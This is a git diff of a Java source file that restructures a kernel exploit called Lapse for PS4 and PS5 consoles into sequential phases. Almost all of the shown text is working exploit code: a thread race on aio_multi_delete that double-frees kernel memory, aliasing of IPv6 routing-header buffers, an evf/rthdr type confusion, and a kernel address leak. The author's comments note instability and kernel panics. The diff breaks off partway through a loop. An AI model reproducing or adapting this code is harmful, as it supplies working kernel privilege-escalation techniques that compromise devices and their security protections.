@@ -4,8 +4,6 @@
 
 package org.bdj.lapse;
 
-import java.io.StringWriter;
-
 /* Lapse is a kernel exploit for PS4 [5.00, 12.50) and PS5 [1.00-10.20) disclosed by an anonymous
  * developer ("abc") in 2025. Credit goes to abc for the proof-of-concept, Al-Azif for lapse.mjs,
  * and shahrilnet and znull_ptr for lapse.lua. BlueLapse primarily references the latter.
@@ -24,9 +22,12 @@ import org.bdj.api.Buffer;
 import org.bdj.lapse.LibKernel.PthreadBarrier;
 import org.bdj.lapse.LibKernel.AioErrorArray;
 import org.bdj.lapse.LibKernel.AioRWRequestArray;
+import org.bdj.lapse.LibKernel.AioSubmitId;
 import org.bdj.lapse.LibKernel.AioSubmitIdArray;
 import org.bdj.lapse.LibKernel.Evf;
 import org.bdj.lapse.LibKernel.Socket;
+import org.bdj.lapse.LibKernel.SocketAddress;
+import org.bdj.lapse.LibKernel.ThreadPriority;
 import org.bdj.lapse.Library.SystemCallFailed;
 
 public class Lapse extends Thread {
@@ -40,505 +41,916 @@ public class Lapse extends Thread {
 		c = k.libc;
 	}
 
+	/** Each phase of the exploit should either succeed or raise an exception */
+	public class Phase {
+		public void run() throws Throwable {}
+		public void cleanup() {}
+		protected boolean enableLogging = true;
+		protected void log(String s)    { if (enableLogging) { Console.log(s); } }
+		protected void log(Throwable t) { if (enableLogging) { Console.log(t); } }
+	}
+
 	public void run() {
 		try {
-			exploit();
+			CoreSetup      coreSetup      = new CoreSetup();
+			BlockWorkers   blockWorkers   = new BlockWorkers();
+			GroomHeap      groomHeap      = new GroomHeap();
+			DoubleFree     doubleFree     = new DoubleFree();
+			AliasRthdrs    aliasRthdrs    = new AliasRthdrs();
+			DeletePrevReqs deletePrevReqs = new DeletePrevReqs();
+			AliasEvfRthdr  aliasEvfRthdr  = new AliasEvfRthdr();
+			BreakASLR      breakASLR      = new BreakASLR();
+			LeakAioEntry   leakAioEntry   = new LeakAioEntry();
+			AliasAioRthdr  aliasAioRthdr  = new AliasAioRthdr();
+
+			try {
+				// Core setup
+				coreSetup.run();
+
+				if (SINGLECORE) {
+					// Block AIO workers from processing requests
+					// FIXME: Experimental, to match lapse.mjs/lua behavior more precisely
+					blockWorkers.run();
+				}
+
+				// FIXME: Let's just not do this and see how it goes
+				// Heap grooming
+				// groomHeap.run();
+
+				// Double-free AIO queue entry
+				doubleFree.run();
+
+				// Retrieve pair of sockets with aliased rthdr structs
+				aliasRthdrs.run();
+
+				// Delete AIO requests created by DoubleFree
+				// FIXME: Experimental, to match lapse.mjs/lua behavior more precisely
+				deletePrevReqs.inIds = doubleFree.outIds;
+				deletePrevReqs.run();
+
+				// Alias evf and rthdr
+				aliasEvfRthdr.inSocketA = aliasRthdrs.outSocketA;
+				aliasEvfRthdr.inSocketB = aliasRthdrs.outSocketB;
+				aliasEvfRthdr.run();
+
+				// Leak kernel addresses
+				breakASLR.inEvf = aliasEvfRthdr.outEvf;
+				breakASLR.inSocket = aliasEvfRthdr.outSocket;
+				breakASLR.run();
+
+				// Leak aio_entry
+				leakAioEntry.inSocket = aliasEvfRthdr.outSocket;
+				leakAioEntry.inKernelHeapAddr = breakASLR.outKernelHeapAddr;
+				leakAioEntry.inKernelImageAddr = breakASLR.outKernelImageAddr;
+				leakAioEntry.run();
+
+				// Double-free SceKernelAioRWRequest/alias with evf
+				aliasAioRthdr.inEvf = aliasEvfRthdr.outEvf;
+				aliasAioRthdr.inSocket = aliasEvfRthdr.outSocket;
+				aliasAioRthdr.inAioEntryAddr = leakAioEntry.outAioEntryAddr;
+				aliasAioRthdr.inKernelHeapAddr = breakASLR.outKernelHeapAddr;
+				aliasAioRthdr.run();
+
+				// Get arbitrary kernel read/write
+
+				// Patch kernel
+
+			} catch (Throwable e) {
+				Console.log(e);
+			} finally {
+				coreSetup     .cleanup();
+				blockWorkers  .cleanup();
+				groomHeap     .cleanup();
+				doubleFree    .cleanup();
+				aliasRthdrs   .cleanup();
+				deletePrevReqs.cleanup();
+				aliasEvfRthdr .cleanup();
+				breakASLR     .cleanup();
+			}
 		} catch (Throwable e) {
 			Console.log(e);
-		} finally {
-			cleanup();
 		}
 	}
 
-	// Pinning seems to break the double-free part for me. I guess that cursed socket nonsense
-	// lapse.lua does really is necessary. Hopefully NOT pinning doesn't cause any problems...
-	// FIXME: I don't actually know if THIS is what breaks the exploit. Something definitely does.
-	// public static final int CPU_CORE = 4;
-	// public int initialCPUAffinity = 0;
+	// FIXME: Experimental, has yet to work as intended
+	public static final boolean SINGLECORE = false;
+	public static final boolean SET_AFFINITY = SINGLECORE ? true : false;
+	public static final boolean SET_PRIORITY = SINGLECORE ? true : false;
 
-	// Note from lapse.lua: on game process, only < 130? sockets can be created
-	public static final int NUM_SOCKETS = 64;     // NUM_SDS in lapse.lua
-	public static final int NUM_SOCKETS_ALT = 48; // NUM_SDS_ALT in lapse.lua
+	private class CoreSetup extends Phase {
+		public static final int MAIN_THREAD_CORE = 4;
+		public static final int RACE_THREAD_CORE = SINGLECORE ? 4 : 3;
 
-	// FIXME: Better naming once I figure out what these are actually used for?
-	Socket[] sockets = new Socket[NUM_SOCKETS];
-	Socket[] socketsAlt = new Socket[NUM_SOCKETS_ALT];
+		private int restoreAffinity;
+		private ThreadPriority restorePriority;
 
-	AioSubmitIdArray ids = null; // should all be cancelled during cleanup
-
-	private void exploit() throws Throwable {
-		Console.log("Lapse: setting things up");
-
-		// Pin so that we only use one per-CPU bucket. Makes heap spraying/grooming easier.
-		// initialCPUAffinity = k.cpuGetAffinityForCurrentThread();
-		// k.cpuSetAffinityForCurrentThread(1 << CPU_CORE);
-
-		// *****************************************************************************************
-		// Step 1: Double-free AIO request
-		// *****************************************************************************************
-
-		final int NUM_AIO_REQUESTS = 3;
-		final int WHICH_REQUEST = NUM_AIO_REQUESTS - 1;
-
-		AioRWRequestArray reqs = k.new AioRWRequestArray(NUM_AIO_REQUESTS);
-		ids = k.new AioSubmitIdArray(NUM_AIO_REQUESTS);
-		AioSubmitIdArray deleteIds = ids.slice(WHICH_REQUEST, 1);
-		AioErrorArray mainErr = k.new AioErrorArray(1);
-		AioErrorArray raceErr = k.new AioErrorArray(1);
-		PthreadBarrier barrier = k.new PthreadBarrier(2);
-
-		try {
-			for (int i = 0; i < sockets.length; i++) {
-				sockets[i] = k.new Socket(LibKernel.AF_INET6, LibKernel.SOCK_DGRAM, LibKernel.IPPROTO_UDP);
+		public void run() throws Throwable {
+			// This was added in the hopes that it might make things more reliable, but no such luck
+			if (SET_AFFINITY) {
+				restoreAffinity = k.cpuGetAffinityForCurrentThread();
+				k.cpuSetAffinityForCurrentThread(1 << MAIN_THREAD_CORE);
 			}
-			for (int i = 0; i < socketsAlt.length; i++) {
-				socketsAlt[i] = k.new Socket(LibKernel.AF_INET6, LibKernel.SOCK_DGRAM, LibKernel.IPPROTO_UDP);
+			if (SET_PRIORITY) {
+				restorePriority = k.cpuGetPriorityForCurrentThread();
+				k.cpuSetPriorityForCurrentThread(new ThreadPriority(LibKernel.PRI_REALTIME, 0x100));
 			}
-		} catch (SystemCallFailed e) {
-			Console.log(e);
-			Console.log("This usually means you have to close the application and try again.");
-			return;
 		}
 
-		// Just keep track of address for this, Buffer wrapper gets in the way
-		// NOTE: We leak this but it probably doesn't matter. Or ought to be leaked anyway?
-		final int RTHDR_SIZE = 0x80;
-		long aliasRthdrBufAddr = 0;
+		public void cleanup() {
+			if (SET_AFFINITY) { k.cpuSetAffinityForCurrentThread(restoreAffinity); }
+			if (SET_PRIORITY) { k.cpuSetPriorityForCurrentThread(restorePriority); }
+		}
+	}
 
-		// Bare minimum initialization to succeed in calling aio_submit_cmd()
-		for (int i = 0; i < reqs.count; i++) { reqs.get(i).fd.set(-1); } // make_reqs1
+	private class BlockWorkers extends Phase {
+		private final int NUM_WORKERS = 2;
+		private AioSubmitIdArray ids = null;
+		private Socket fds[] = null;
 
-		// Initial heap grooming (maybe this will make the exploit more stable?)
-		final int NUM_GROOM_TRIES = 512;
-		AioSubmitIdArray groomIds = k.new AioSubmitIdArray(NUM_AIO_REQUESTS);
-		Console.log("Lapse: initial heap grooming pass");
-		for (int i = 0; i < NUM_GROOM_TRIES; i++) {
-			k.aioSubmitCmd(LibKernel.AIO_CMD_MULTI_READ, reqs, groomIds);
-			k.aioMultiCancel(groomIds, null);
+		public void run() throws Throwable {
+			log("BlockWorkers: blocking AIO worker threads");
+
+			AioRWRequestArray reqs = k.new AioRWRequestArray(NUM_WORKERS);
+			ids = k.new AioSubmitIdArray(NUM_WORKERS);
+			fds = k.socketPair(LibKernel.AF_UNIX, LibKernel.SOCK_STREAM);
+
+			for (int i = 0; i < NUM_WORKERS; i++) {
+				reqs.get(i).nbyte.set(1);
+				reqs.get(i).fd.set(fds[0].fd);
+			}
+
+			k.aioSubmitCmd(LibKernel.AIO_CMD_READ, reqs, ids);
 		}
 
-		final int NUM_DOUBLE_FREE_TRIES = 20000;
-		boolean success = false;
+		public void cleanup() {
+			if (ids != null) {
+				k.aioMultiWait(ids, null, LibKernel.AIO_WAIT_AND);
+				k.aioMultiDelete(ids, null);
+			}
+			if (fds != null) {
+				fds[0].close();
+				fds[1].close();
+			}
+		}
+	}
 
-		for (int i = 0; i < NUM_DOUBLE_FREE_TRIES; i++) {
-			Console.log("Lapse: double-free attempt " + i);
-			// FIXME: abc's PoC does this (and the wait) inside the loop but that seems weird?
-			// lapse.lua/mjs does it outside the loop, try that and see if it still works
-			try {
-				// Issue requests and get back submission IDs to use later
+
+	private class GroomHeap extends Phase {
+		// Allocate enough so that we start allocating from a newly created slab
+		public final int NUM_GROOMS = 512;
+		public final int NUM_REQS_PER_GROOM = 3;
+
+		public void run() throws Throwable {
+			log("Heap grooming: " + NUM_GROOMS + " * " + NUM_REQS_PER_GROOM + " reqs");
+
+			AioRWRequestArray reqs = k.new AioRWRequestArray(NUM_REQS_PER_GROOM);
+			AioSubmitIdArray ids = k.new AioSubmitIdArray(NUM_GROOMS * NUM_REQS_PER_GROOM);
+			reqs.initMinimal();
+
+			for (int i = 0; i < NUM_GROOMS; i++) {
+				int idCount = NUM_REQS_PER_GROOM, idOffset = i * idCount;
+				k.aioSubmitCmd(LibKernel.AIO_CMD_MULTI_READ, reqs, ids.slice(idOffset, idCount));
+			}
+
+			k.aioUtilBatchCancel(ids, null);
+		}
+	}
+
+	private class DoubleFree extends Phase {
+		// FIXME: Experimental, to match lapse.mjs/lua behavior more precisely
+		public AioSubmitIdArray outIds = null;
+
+		private AioSubmitIdArray cleanupIds = null;
+
+		private void setCleanupIds(AioSubmitIdArray src, int excludeIndex) {
+			cleanupIds = null;
+			if (src != null) {
+				cleanupIds = k.new AioSubmitIdArray(src.count - 1);
+				for (int i = 0, j = 0; i < cleanupIds.count; i++) {
+					if (j == excludeIndex) continue;
+					cleanupIds.set(i, src.get(j++).get());
+				}
+			}
+		}
+		private void setCleanupIds(AioSubmitIdArray src) {
+			setCleanupIds(src, -1);
+		}
+
+		private class MultiDeleteThread extends Thread {
+			public Buffer outThreadId;
+			public PthreadBarrier inoutBarrier;
+			public AioSubmitIdArray inIds;
+			public AioErrorArray inoutErr;
+
+			public void run() {
+				try {
+					if (SET_AFFINITY) {
+						k.cpuSetAffinityForCurrentThread(1 << CoreSetup.RACE_THREAD_CORE);
+					}
+					if (SET_PRIORITY) {
+						k.cpuSetPriorityForCurrentThread(
+							new ThreadPriority(LibKernel.PRI_REALTIME, 0x100));
+					}
+					outThreadId.putLong(0, k.cpuGetCurrentThreadId());
+					long pids = inIds.address();
+					long nids = inIds.count;
+					long perr = inoutErr.address();
+					inoutBarrier.barrierWait();
+					// k.aioMultiDelete(inIds, inoutErr);
+					long r = k.SYS_aio_multi_delete.call(pids, nids, perr);
+					if (r != 0) {
+						throw new SystemCallFailed("aio_multi_delete", k.errno(), c);
+					}
+				} catch (Throwable e) {
+					log("MultiDeleteThread: exception encountered:");
+					log(e);
+				}
+			}
+		}
+
+		public void run() throws Throwable {
+			final int NUM_FREE_ATTEMPTS = 10000;
+			final int NUM_REQS = 3;
+			final int TARGET_REQ = NUM_REQS - 1;
+
+			AioRWRequestArray reqs = k.new AioRWRequestArray(NUM_REQS);
+			AioSubmitIdArray  ids  = k.new AioSubmitIdArray (NUM_REQS);
+			reqs.initMinimal();
+
+			AioSubmitIdArray targetIds = ids.slice(TARGET_REQ, 1);
+			PthreadBarrier barrier = k.new PthreadBarrier(2);
+
+			// lapse.mjs/lua do some kind of socket/suspend/yield nonsense to work around the lack
+			// of multithreading in their runtime environments. We don't have that problem here but
+			// my way is just resulting in an unreliable exploit. Maybe this will be better?
+			SocketAddress address = k.new SocketAddress(LibKernel.AF_INET, 5050, 127, 0, 0, 1);
+			Socket listen = k.new Socket(LibKernel.AF_INET, LibKernel.SOCK_STREAM, 0);
+			if (SINGLECORE) {
+				listen.setReuseAddr(true);
+				listen.bind(address);
+				listen.listen(1);
+			}
+
+			boolean successful = false;
+			for (int attempt = 0; attempt < NUM_FREE_ATTEMPTS; attempt++) {
+				log("DoubleFree: attempt " + attempt + " of " + NUM_FREE_ATTEMPTS);
+
+				// FIXME: Touching the console during this loop makes panics MUCH more likely
+				// To be fair the console is kind of a clown car operation and every log call does
+				// various kinds of JVM thread synchronization nonsense. It should really be fixed.
+				enableLogging = false;
+
+				Socket client, connection;
+				if (SINGLECORE) {
+					client = k.new Socket(LibKernel.AF_INET, LibKernel.SOCK_STREAM, 0);
+					client.connect(address);
+					connection = listen.accept();
+					log("-> socket connected: fd " + connection.fd);
+				}
+
+				reqs.initMinimal();
+				if (SINGLECORE) {
+					// We want aio_multi_delete (on the worker thread) to call soclose() on the fd
+					reqs.get(TARGET_REQ).fd.set(connection.fd);
+					// We'll force soclose() to sleep by setting SO_LINGER
+					connection.setLinger(true, 1);
+				}
+
 				// Command and priority do not matter but the MULTI flag is required
-				k.aioSubmitCmd(LibKernel.AIO_CMD_MULTI_WRITE, reqs, ids);
-				Console.log("-> aioSubmitCmd MULTI_WRITE for " + reqs.count + " reqs => ids");
-			} catch (SystemCallFailed e) {
-				Console.log(e);
-				Console.log("This usually means you have to close the application and try again.");
-				return;
+				log("-> calling aio_submit_cmd");
+				k.aioSubmitCmd(LibKernel.AIO_CMD_MULTI_READ, reqs, ids);
+
+				log("-> new request ids: " + ids.toString());
+				setCleanupIds(ids);
+
+				// You cannot delete any request that is already being processed by a SceFastAIO
+				// worker thread. We just wait on them instead of polling and checking whether a
+				// request is being processed. Polling is also error-prone since the request can
+				// become out of date.
+				// NOTE: This bit is taken from abc's PoC, lapse.mjs/lua are slightly different.
+				// Not sure if their version is more reliable? Maybe it is for single-core?
+				// log("-> calling aio_multi_wait");
+				// k.aioMultiWait(ids, null, LibKernel.AIO_WAIT_AND);
+
+				// This is what lapse.mjs/lua do:
+				log("-> calling aio_multi_cancel");
+				k.aioMultiCancel(ids, null);
+				log("-> calling aio_multi_poll");
+				k.aioMultiPoll(ids, null);
+
+				if (SINGLECORE) {
+					// Drop the reference so that aio_multi_delete will trigger _fdrop
+					log("-> closing connection");
+					connection.close();
+				}
+
+				AioErrorArray mainErr = k.new AioErrorArray(1);
+				AioErrorArray raceErr = k.new AioErrorArray(1);
+
+				// Indicate that we shouldn't clean up the target request
+				// FIXME: Not sure this is actually needed, or the correct thing to do.
+				// Is there even a way to make the exploit fail safe if the next step fails?
+				setCleanupIds(ids, TARGET_REQ);
+
+				log("-> starting MultiDeleteThread for " + targetIds);
+
+				MultiDeleteThread racer = new MultiDeleteThread();
+				racer.outThreadId = new Buffer(8);
+				racer.inoutBarrier = barrier;
+				racer.inIds = targetIds;
+				racer.inoutErr = raceErr;
+				racer.start();
+
+				log("-> waiting for thread to be ready");
+				k.waitUntilNotEqualLong(racer.outThreadId, 0, 0, 1, 1000);
+				long racerThreadId = racer.outThreadId.getLong(0);
+
+				boolean issuedDelete = false;
+
+				log("-> thread id is " + racerThreadId + "; waiting for barrier");
+
+				long pids = targetIds.address();
+				long nids = targetIds.count;
+				long perr = mainErr.address();
+
+				barrier.barrierWait(); // enter barrier as last waiter, hopefully (in SINGLECORE)
+
+				if (SINGLECORE) {
+					log("-> yield");
+					k.yield(); // hope scheduler calls racer next
+
+					// racer should now be in soclose, suspend so it doesn't finish
+					long r = k.SYS_thr_suspend_ucontext.call(racerThreadId);
+					log("-> thread suspended; ret " + r + " errno " + k.errno());
+
+					try {
+						AioErrorArray pollResultBuf = k.new AioErrorArray(1);
+						k.aioMultiPoll(targetIds, pollResultBuf);
+
+						int pollResult = pollResultBuf.get(0).get();
+						log("-> aio_multi_poll result: 0x" + Integer.toHexString(pollResult));
+
+						int tcpState = connection.getTCPState();
+						log("-> connection TCP state:  0x" + Integer.toHexString(tcpState));
+
+						if (pollResult != LibKernel.SCE_KERNEL_ERROR_ESRCH &&
+							tcpState != LibKernel.TCPS_ESTABLISHED)
+						{
+							// We can now call aio_multi_delete and hopefully trigger the double-free,
+							// since the other thread is stuck inside aio_multi_delete as well
+							// PANIC: This call will make the system vulnerable to a kernel panic:
+							// Double free on the 0x80 malloc zone. Important kernel data may alias.
+							log("-> calling aio_multi_delete");
+							// k.aioMultiDelete(targetIds, mainErr);
+							r = k.SYS_aio_multi_delete.call(pids, nids, perr);
+							if (r != 0) {
+								throw new SystemCallFailed("aio_multi_delete", k.errno(), c);
+							}
+							issuedDelete = true;
+						}
+					} catch (Exception e) {
+						enableLogging = true; // FIXME
+						log("DoubleFree: error in main thread aio_multi_delete section:");
+						log(e);
+						issuedDelete = false;
+					} finally {
+						log("-> closing connection");
+						connection.close();
+						log("-> resuming and waiting for thread");
+						k.SYS_thr_resume_ucontext.call(racerThreadId);
+						racer.join();
+					}
+				}
+
+				if (!SINGLECORE) {
+					// Don't do anything else, we have a race condition to win
+					k.aioMultiDelete(targetIds, mainErr);
+					issuedDelete = true;
+
+					log("-> waiting for thread");
+					racer.join();
+				}
+
+				enableLogging = true; // FIXME
+
+				if (issuedDelete) {
+					int mainErrCode = mainErr.get(0).get();
+					String mainErrCodeHex = Integer.toHexString(mainErrCode);
+					log("-> main thread aio_multi_delete: error 0x" + mainErrCodeHex);
+
+					int raceErrCode = raceErr.get(0).get();
+					String raceErrCodeHex = Integer.toHexString(raceErrCode);
+					log("-> race thread aio_multi_delete: error 0x" + raceErrCodeHex);
+
+					// The race is successful if both error codes are 0
+					if (mainErrCode == 0 && raceErrCode == 0) {
+						successful = true;
+						outIds = ids;
+						break;
+					}
+				}
+
+				if (successful) {
+					listen.close();
+					break;
+				}
+
+				// Clean up so multiple failed runs don't result in running out of aio handles
+				// FIXME: Remove in case this is what's making the exploit even worse than usual
+				// cleanup();
 			}
 
-			// You cannot delete any request that is already being processed by a
-			// SceFsstAIO worker thread.
-			// We just wait on all of them instead of polling and checking whether
-			// a request is being processed. Polling is also error-prone since the
-			// result can become out of date.
-			k.aioMultiWait(ids, null, LibKernel.AIO_WAIT_AND);
+			if (!successful) {
+				throw new Exception("Couldn't double-free an AIO queue entry");
+			}
 
-			Console.log("-> aioMultiWait for " + ids.count + " ids (0x" +
-				Long.toHexString(ids.address()) + ") done");
+			// Are we supposed to clean up now? It's not super clear why lapse.mjs calls
+			// aio_multi_delete *after* make_aliased_rthdrs. Could be important or could be an
+			// incidental detail? I'll just defer cleanup until the end and see what happens.
+		}
 
-			RaceThread racer = new RaceThread(barrier, deleteIds, raceErr);
-			Console.log("-> starting race thread");
-			racer.start();
+		public void cleanup() {
+			log("DoubleFree: deleting " + cleanupIds.count + " leftover requests");
+			try {
+				k.aioUtilBatchCancelPollDelete(cleanupIds);
+			} catch (Throwable e) {
+				// Something else may have deleted these requests?
+				log(e);
+			}
+			cleanupIds = null;
+		}
+	}
 
-			// Sync point between threads
-			barrier.barrierWait();
+	private class AliasRthdrs extends Phase {
+		/** Pair of sockets with aliased ip6_rthdr structs in kernel memory */
+		public Socket outSocketA, outSocketB;
 
-			// Hopefully both threads will call aio_multi_delete at the same time
-			// PANIC: This call will make the system vulnerable to a kernel panic:
-			// Double free on the 0x80 malloc zone. Important kernel data may alias.
-			k.aioMultiDelete(deleteIds, mainErr);
+		private final int MALLOC_SIZE = 0x80;
+		private final int RTHDR_LEN = ((MALLOC_SIZE >> 3) - 1) & ~1;
+		private final int RTHDR_SIZE = (RTHDR_LEN + 1) << 3;
+		private Buffer rthdrTemplate = new Buffer(RTHDR_SIZE);
 
-			Console.log("-> aioMultiDelete for " + deleteIds.count + " ids (0x" +
-				Long.toHexString(deleteIds.address()) + ") done");
+		private final int NUM_SOCKETS = 64; // num_sds in lapse.mjs
+		private Socket sockets[] = null;
+		private int socketsUsed = 0;
 
-			// Wait for race thread to finish
-			racer.join();
-			Console.log("-> race thread finished");
+		public AliasRthdrs() {
+			// IPV6_RTHDR (routing header) options struct for setsockopt, build_rthdr in lapse.mjs
+			// FIXME: Would be nice to have a BufferLike class that mirrors the rthdr structure
+			rthdrTemplate.putByte(0, (byte)0);                // ip6r_next
+			rthdrTemplate.putByte(1, (byte)RTHDR_LEN);        // ip6r_len
+			rthdrTemplate.putByte(2, (byte)0);                // ip6r_type
+			rthdrTemplate.putByte(3, (byte)(RTHDR_LEN >> 1)); // ip6r_segleft
 
-			// RESTORE: This code will reserve the double freed memory (see PANIC above).
-			// FIXME: Is this actually the case or am I totally misunderstanding?
-			aliasRthdrBufAddr = api.malloc(RTHDR_SIZE);
-			Console.log("-> allocated aliased buffer at 0x" + Long.toHexString(aliasRthdrBufAddr));
+			// Allocated here because DoubleFree induces a PANIC state that AliasRthdrs.run needs
+			// to RESTORE, and creating sockets involves syscalls and kernel memory allocation
+			sockets = new Socket[NUM_SOCKETS];
+			socketsUsed = NUM_SOCKETS;
+			for (int i = 0; i < sockets.length; i++) {
+				sockets[i] = k.new SocketUDP6();
+			}
+		}
 
-			// Read errors. The race is successful if they are both zero.
-			int m = mainErr.get(0).id.get();
-			int r = raceErr.get(0).id.get();
-			Console.log("-> errors: 0x" + Integer.toHexString(m) + " 0x" + Integer.toHexString(r));
-			if (m == 0 && r == 0) {
-				Console.log("-> double free achieved!");
-				success = true;
+		public void run() throws Throwable {
+			final int NUM_ALIAS_ATTEMPTS = 1000;
+			final int MARKER_OFFSET = 4;
+			Buffer buf = new Buffer(MALLOC_SIZE);
+
+			for (int aliasAttempt = 0; aliasAttempt < NUM_ALIAS_ATTEMPTS; aliasAttempt++) {
+				log("AliasRthdr: attempt " + aliasAttempt);
+
+				for (int i = 0; i < sockets.length; i++) {
+					rthdrTemplate.putInt(MARKER_OFFSET, i);
+
+					// FIXME: I don't really get this bit of the exploit. lapse.mjs has these
+					// comments on the call to make_aliased_rthdrs, but surely the reclamation
+					// happens later, when we next call aioMultiDelete? Or does that call's
+					// RESTORE comment correspond to the PANIC comment on this one?
+					// RESTORE: Reclaim double-freed memory with harmless data(?)
+					// PANIC: 0x80 malloc zone pointers aliased(?)
+					sockets[i].setRthdr(rthdrTemplate);
+				}
+
+				for (int i = 0; i < NUM_SOCKETS; i++) {
+					sockets[i].getRthdr(buf);
+					int m = buf.getInt(MARKER_OFFSET);
+					if (m == i) {
+						// No corruption occurred for this rthdr, can ignore it
+						continue;
+					}
+					outSocketA = sockets[i]; sockets[i] = null;
+					outSocketB = sockets[m]; sockets[m] = null;
+					socketsUsed -= 2;
+					break; // done
+				}
+
+				if (outSocketA != null) break; // done
+			}
+
+			if (outSocketA == null) {
+				throw new Exception("Couldn't construct aliasing rthdr structs");
+			}
+
+			log("-> aliased rthdrs on sockets " + outSocketA.fd + "/" + outSocketB.fd);
+			cleanupLeftoverSockets();
+		}
+
+		public void cleanup() {
+			cleanupLeftoverSockets();
+			outSocketA.close();
+			outSocketB.close();
+		}
+
+		private void cleanupLeftoverSockets() {
+			if (sockets == null) return;
+			log("AliasRthdrs: closing " + socketsUsed + " leftover sockets");
+			for (int i = 0; i < sockets.length; i++) {
+				if (sockets[i] == null) continue;
+				sockets[i].close();
+			}
+			sockets = null;
+		}
+	}
+
+	private class DeletePrevReqs extends Phase {
+		public AioSubmitIdArray inIds;
+
+		public void run() throws Throwable {
+			log("DeletePrevReqs: deleting: " + inIds);
+			// Comment from lapse.mjs:
+			// MEMLEAK: if we won the race, aio_obj.ao_num_reqs got decremented
+			// twice. this will leave one request undeleted
+			k.aioMultiDelete(inIds, null);
+		}
+	}
+
+	private class AliasEvfRthdr extends Phase {
+		/** Pair of sockets with aliased ip6_rthdr structs in kernel memory */
+		public Socket inSocketA, inSocketB;
+
+		/** Socket with ip6_rthdr struct aliased with outEvf's kernel memory */
+		public Socket outSocket;
+		/** Handle of evf struct aliased with outSocket's ip6_rthdr in kernel memory */
+		public Evf outEvf;
+
+		Evf evfs[] = null;
+
+		public void run() throws Throwable {
+			outSocket = inSocketA;
+
+			// PANIC/MEMLEAK?
+			inSocketB.close();
+
+			final int NUM_CONFUSION_ATTEMPTS = 100;
+			final int MALLOC_SIZE = 0x80;
+			final int NUM_EVFS = 256;
+
+			Buffer buf = new Buffer(MALLOC_SIZE);
+
+			boolean successful = false;
+			for (int attempt = 0; attempt < NUM_CONFUSION_ATTEMPTS; attempt++) {
+				log("AliasEvfRthdr: attempt " + attempt);
+
+				evfs = new Evf[NUM_EVFS];
+				for (int i = 0; i < evfs.length; i++) {
+					// Flags must be set to >= 0xf00 to fully leak contents of rthdr
+					// i << 16 is used as a marker below
+					int flags = 0xf00 | (i << 16);
+					evfs[i] = k.new Evf(0, flags);
+				}
+
+				// rthdr should now be aliased with kernel memory for one of the evfs, so if we
+				// read from it we should see one of our flag|marker dwords
+				outSocket.getRthdr(buf.slice(0, MALLOC_SIZE));
+				int flags2 = buf.getInt(0);
+				int evfidx = flags2 >> 16;
+				log("-> read 0x" + Integer.toHexString(flags2) + " (idx " + evfidx + ")");
+				if (evfidx > NUM_EVFS) {
+					continue; // try again
+				}
+				outEvf = evfs[evfidx]; // will just be zero if unsuccessful
+
+				// Check if this is the right evf by writing something through the evf API and
+				// reading it back through getsockopt
+				int modified = flags2 | 1;
+				outEvf.set(modified);
+				outSocket.getRthdr(buf.slice(0, MALLOC_SIZE));
+				int readback = buf.getInt(0);
+				log("-> set  0x" + Integer.toHexString(modified));
+				log("-> read 0x" + Integer.toHexString(readback));
+				if (readback != modified) {
+					cleanupEvfs();
+					continue; // try again
+				}
+
+				// outEvf's evf struct now aliases outSocketA's rthdr struct
+				evfs[evfidx] = null; // prevent it from being cleaned up
+				log("-> evf " + outEvf.id + " aliases rthdr of socket " + outSocket.fd);
+
+				successful = true;
 				break;
 			}
 
-			Console.log("-> attempt failed, deleting leftover ids");
-			AioSubmitIdArray leftIds = k.new AioSubmitIdArray(ids.count - 1);
-			int copyOrigId = 0;
-			for (int copyLeftId = 0; copyLeftId < leftIds.count; copyLeftId++) {
-				if (ids.get(copyOrigId).get() == deleteIds.get(0).get()) continue;
-				leftIds.set(copyLeftId, ids.get(copyOrigId).get());
-				copyOrigId++;
+			if (!successful) {
+				throw new Exception("Couldn't construct aliasing evf/rthdr pair");
 			}
-			// free_aios
-			try {
-				k.aioMultiCancel(leftIds, null);
-				k.aioMultiPoll(leftIds, null);
-				k.aioMultiDelete(leftIds, null);
-			} catch (Throwable e) {}
+
+			cleanupEvfs(); // can free other evfs now
 		}
 
-		if (!success) {
-			Console.log("Lapse: couldn't achieve double free in " + NUM_DOUBLE_FREE_TRIES + " tries");
-			return;
+		public void cleanup() {
+			cleanupEvfs();
+			if (outEvf != null) { outEvf.delete(); }
 		}
 
-		// Continue with make_aliased_rthdrs from lapse.lua/mjs
-		// RESTORE: This will fill the double freed memory with harmless data (see PANIC above).
-
-		Console.log("Lapse: make aliased rthdrs");
-
-		Buffer aliasRthdrBuf = new Buffer(aliasRthdrBufAddr, RTHDR_SIZE);
-		aliasRthdrBuf.fill((byte)0); // should probably do this before anything else...
-		int markerOffset = 4; // into aliasRthdrBuf, used to check if we've successfully aliased?
-
-		int ip6rLen = ((RTHDR_SIZE >> 3) - 1) & (~1);
-		int rthdrLen = (ip6rLen + 1) << 3; // rsize in lapse
-		Buffer aliasRthdrBufAdjLen = new Buffer(aliasRthdrBufAddr, rthdrLen);
-
-		Console.log("-> RTHDR_SIZE " + RTHDR_SIZE + " ip6rLen " + ip6rLen + " rthdrLen " + rthdrLen);
-
-		// IPV6_RTHDR (routing header?) options struct for setsockopt
-		aliasRthdrBuf.putByte(0, (byte)0);              // ip6r_nxt
-		aliasRthdrBuf.putByte(1, (byte)ip6rLen);        // ip6r_len
-		aliasRthdrBuf.putByte(2, (byte)0);              // ip6r_type
-		aliasRthdrBuf.putByte(3, (byte)(ip6rLen >> 1)); // ip6r_segleft
-
-		Socket[] aliasSocketPair = new Socket[2];
-
-		final int NUM_RTHDR_ALIAS_TRIES = 1000;
-		boolean aliasSocketPairFound = false;
-
-		for (int iTry = 0; iTry < NUM_RTHDR_ALIAS_TRIES; iTry++) {
-			Console.log("Lapse: aliased socket pair attempt " + iTry);
-			for (int iSocket = 0; iSocket < NUM_SOCKETS; iSocket++) {
-				Socket socket = sockets[iSocket];
-				aliasRthdrBuf.putInt(markerOffset, iSocket);
-				// Does setsockopt actually need to be called with rthdrLen?
-				socket.setOption(LibKernel.IPPROTO_IPV6, LibKernel.IPV6_RTHDR, aliasRthdrBufAdjLen);
+		private void cleanupEvfs() {
+			if (evfs == null) return;
+			log("AliasEvfRthdr: closing " + evfs.length + " evfs");
+			for (int i = 0; i < evfs.length; i++) {
+				if (evfs[i] == null) continue;
+				evfs[i].delete();
 			}
-			for (int iSocket = 0; iSocket < NUM_SOCKETS; iSocket++) {
-				Socket socket = sockets[iSocket];
-				// Why pass the full length here but not for setsockopt in 1st loop? Does it matter?
